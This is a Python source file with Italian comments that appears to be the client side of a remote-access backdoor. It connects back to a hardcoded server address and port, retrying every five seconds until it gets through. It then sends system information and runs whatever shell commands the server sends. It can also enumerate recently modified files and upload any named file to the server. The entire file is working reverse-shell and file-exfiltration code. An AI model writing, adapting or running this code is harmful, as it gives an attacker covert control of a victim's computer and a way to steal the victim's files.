import math
from socket import *
import subprocess
import platform
import os
import time

serverIp = '172.26.80.1'
serverPort = 12018

windowsFlag = "n"


def exitNClose(clientSocket):
    out = "Ok"
    clientSocket.send(out.encode())
    clientSocket.close()
    return True


def changeDirectory(clientSocket, cmd):
    out = ""
    if cmd != "cd":
        cmd = cmd.replace("cd ", "")
    try:
        os.chdir(cmd)
        out = os.getcwd()
    except:
        out = "Path not found"
    clientSocket.send(out.encode())


def getFile(clientSocket: socket, fileName):
    fileSize = os.path.getsize(fileName)
    clientSocket.recv(4).decode()
    fileSize = str(fileSize)
    clientSocket.send(fileSize.encode())
    clientSocket.recv(4).decode()
    fileSize = int(fileSize)
    file = open(fileName, 'rb')
    while fileSize > 0:
        if fileSize < 1024:
            l = file.read(fileSize)
        else:
            l = file.read(1024)
        fileSize = fileSize - 1024
        clientSocket.send(l)
        print("Caricamento...")
    print("Inviato")
    file.close()


def StartConnection():  # apre la connessione con il server
    global serverIp, serverPort
    serverName = serverIp
    serverPort = serverPort
    clientSocket = socket(AF_INET, SOCK_STREAM)

    while True:
        try:
            clientSocket.connect((serverName, serverPort))
            break
        except:
            print("Server down")

        time.sleep(5)

    return clientSocket


def sendOsInfo(clientSocket: socket):  # funzione che invia informazioni di sistema
    pack = "Architecture: " + platform.architecture()[
        0] + "\nMacchine: " + platform.machine() + "\nSystem name: " + platform.system()
    pack = pack + "\nOperating system release: " + platform.release() + "\nOperating system version: " + \
           platform.version() + "\nNode: " + platform.node() + "\nPlatform: " + platform.platform() + "\nProcessor: " + platform.processor()
    clientSocket.send(pack.encode())


def RecuperaOs(clientSocket: socket):
    global windowsFlag
    if "Windows" in platform.system():
        clientSocket.send("w".encode())
        windowsFlag = "w"
        print("Ci troviamo su Windows")
    else:
        clientSocket.send("u".encode())
        windowsFlag = "u"
        print("Ci troviamo su Unix")


def searchCmd(clientSocket, cmd):
    try:
        shellCommandExecuter(clientSocket, cmd)
        return True
    except:
        clientSocket.send("notFound".encode())
        return False


#def sendString(clientSocket, word):
#    clientSocket.send(str(math.ceil(word.__sizeof__() / 1024)).encode())
#    n = 1024
#    for i in range(0, len(word), n):
#         clientSocket.send(word[i:i + n].encode())


def sendString(socket: socket, res: str):
    x = res.encode()
    g = [x[i:i + 1024] for i in range(0, len(x) - 1, 1024)]
    are = g.__len__()
    socket.send(str(are).encode())
    print(socket.recv(1024).decode())
    for i in g:
        socket.send(i)
        socket.recv(2)
        print(i)
    return g




def shellCommandExecuter(clientSocket, cmd):
    output = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
    if output == "":
        output = "NULL"
    sendString(clientSocket, output)


def recentFilesCmd(clientSocket, fromData="1990-01-01"):
    output = ""
    try:
        fileList = [" "]
        path = ""
        for root, dirs, files in os.walk(".", topdown=True):
            for file in files:
                path = os.path.join(root, file)
                if os.path.exists(path):
                    fileData = os.path.getmtime(path)
                    data = time.strftime('%Y-%m-%d', time.localtime(fileData))
                    if data >= fromData:
                        fileList.append(data + " " + path)
        fileList.sort()
        for elem in fileList:
            string = elem + "\n"
            output = output + string
    except:
        output = "Error"
    sendString(clientSocket, output)


def main():
    while True:
        esc = False
        while not esc:
            try:
                clientSocket = StartConnection()
                RecuperaOs(clientSocket)

                while not esc:
                    cmd = clientSocket.recv(1024).decode()
                    if len(cmd) == 0:
                        break

                    elif cmd == "setOs":
                        global windowsFlag
                        windowsFlag = input()

                    elif "cd" in cmd:
                        changeDirectory(clientSocket, cmd)

                    elif cmd == "esc":
                        esc = exitNClose(clientSocket)

                    elif "get " in cmd:
                        path = ""
                        fileName = cmd.replace("get ", "")
                        if not fileName == "":
                            path = os.path.join(path, os.getcwd(), fileName)
                            if os.path.exists(path):
                                clientSocket.send("ok".encode())
                                getFile(clientSocket, fileName)
                            else:
                                clientSocket.send("ko".encode())

                    elif cmd == "infoOs":
                        sendOsInfo(clientSocket)

                    elif "search" in cmd:
                        shellCommand = clientSocket.recv(1024).decode()  # 78
                        searchCmd(clientSocket, shellCommand)

                    elif "rf" in cmd:
                        if cmd == "rf":
                            recentFilesCmd(clientSocket)
                        elif "rf " in cmd:
                            data = cmd.replace("rf ", "")
                            if data > time.strftime("%Y:%m:%d"):
                                print("Too forward")
                            else:
                                recentFilesCmd(clientSocket, data)
                    elif "pwd" == cmd:
                        print("pwd")

                    elif "esc" == cmd:
                        print("Server exited")

                    elif "dir" in cmd or "ls" in cmd:
                        if windowsFlag == "w":
                            cmd = "dir"
                        else:
                            cmd = "ls"
                        shellCommandExecuter(clientSocket, cmd)

                    elif "nsf" in cmd:
                        cmd = cmd.replace("nsf ", "")
                        shellCommandExecuter(clientSocket, cmd)

            except Exception as e:
                print(e)
                print("errore Riavvio in corso")
                clientSocket.close()


if __name__ == "__main__":
    main()
